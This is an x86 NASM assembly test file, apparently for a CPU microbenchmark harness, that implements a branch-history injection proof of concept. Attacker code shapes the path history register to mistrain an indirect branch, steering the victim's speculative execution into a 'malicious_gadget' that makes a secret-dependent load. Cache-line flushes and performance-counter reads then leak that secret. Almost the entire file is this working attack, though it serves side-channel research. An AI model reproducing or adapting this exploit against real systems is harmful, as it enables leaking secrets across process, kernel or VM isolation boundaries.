%include "./SET_VICTIM_PHR0.nasm"
%include "./SET_VICTIM_PHR1.nasm"
%include "./SET_ATTACKER_PHR0.nasm"
%include "./SET_ATTACKER_PHR1.nasm"

%define nthreads 1
%define repeat0  repeat0_input
%define repeat1  100
%define repeat2  1
%define noptype  2

%macro testinitc 0  ; initialization
    mov dword[PrintCustomPMC], 1
%endmacro

%macro testinit3 0

    rdrand rdx
    and rdx, 1
    mov qword[UserData], rdx
    mfence
    call attacker_evict

    SERIALIZE

    xor qword[UserData], 1
    mfence
    call attacker_evict

    SERIALIZE

    %rep 20
        mov rax, sec_attacker_ibranch_addr
        call rax 
    %endrep

%endmacro

%macro testcode 0   ; main test

    %assign i secret
    %rep 1
     %assign addr_offset 2048+i*512
     clflush [UserData+%+ addr_offset]
    %assign i i+1
    %endrep

    rdrand rdx
    and rdx, 1
    mov qword[UserData], rdx
    mfence
    lea rbx, [UserData]
    mov rax, sec_victim_ibranch_addr
    call rax

    READ_PMC_START
    %assign addr_offset 2048+secret*512
     mov rax, [UserData+%+ addr_offset]
    READ_PMC_END

    %rep 512
     nop
    %endrep

%endmacro

%macro SHIFT_PHR 2  ; the macro code to left-shift the phr
    mov rax, %1
    jmp shift_phr%+ %2
    align 1<<16
    %rep (1<<16)-64
     nop
    %endrep
    shift_phr%+ %2:
    %rep 64-8
     nop
    %endrep
    dec rax
    cmp rax, 0
    jg shift_phr%+ %2
%endmacro

SECTION .sec_victim_ibranch exec
victim_ibranch:
    mov rdx, qword[rbx]
    lea r10, [victim_target_0]
    lea r9, [victim_target_1]
    cmp rdx, 1
    cmovz r10, r9
    mov qword[rbx+8], r10
    clflush [rbx+8]
    mfence
    
    cmp rdx, 1
    je victim_set_PHR1_start
    SHIFT_PHR 195,100
    %rep 23
     nop
    %endrep
    SET_VICTIM_PHR0 0

victim_set_PHR1_start:
    SHIFT_PHR 195,101
    %rep 23
     nop
    %endrep
    SET_VICTIM_PHR1 0
victim_set_PHR1_end:
    
    %rep victim_pc_14to12 << 12
     nop
    %endrep

    %rep (50)<<6
     nop
    %endrep
    jmp [rbx+8]
    %rep 64
     nop
    %endrep
victim_target_0:
    %rep 64
     nop
    %endrep
    ret
victim_target_1:
    %rep 64
     nop
    %endrep
    ret
    %rep 33
     nop
    %endrep
malicious_gadget: ; a malicious gadget will never be reached in the correct control flow
    mov rax, secret
    shl rax, 9
    lea rcx, [rbx+2048]
    add rcx, rax
    mov rax, [rcx] ; a secret-dependent load
    %rep 64
     nop
    %endrep
    ret

SECTION .sec_attacker_ibranch exec
attacker_ibranch:
    %rep pc_14to12<<12
     nop
    %endrep
    %rep pc_11to5<<5
     nop
    %endrep
    %rep 12
     nop
    %endrep
    lea r10, [inject_t]
    jmp r10
    %rep 227
     nop
    %endrep
inject_t:
    %rep 512
     nop
    %endrep
    ret

SECTION .sec_attacker_evict exec
attacker_evict:
    %assign i 0
    %rep 1
        mov rdx, qword[UserData]
        lea r10, [attacker_target_0_%+ i]
        lea r9, [attacker_target_1_%+ i]
        cmp rdx, 1
        cmovz r10, r9
        mfence

        cmp rdx, 1
        je attacker_set_PHR1_start_%+ i
        SHIFT_PHR 195,i
        %rep 23
         nop
        %endrep
        SET_ATTACKER_PHR0 i

    attacker_set_PHR1_start_%+ i:
        %assign j i+10
        SHIFT_PHR 195,j
        %rep 23
         nop
        %endrep
        SET_ATTACKER_PHR1 i
    attacker_set_PHR1_end_%+ i:

        %rep i<<6
         nop
        %endrep
        jmp r10
        %rep 64 
         nop
        %endrep
    attacker_target_0_%+ i:
        %rep 64
         nop
        %endrep
    attacker_target_1_%+ i:
        %rep 64
         nop
        %endrep
    %assign i i+1
    %endrep
    ret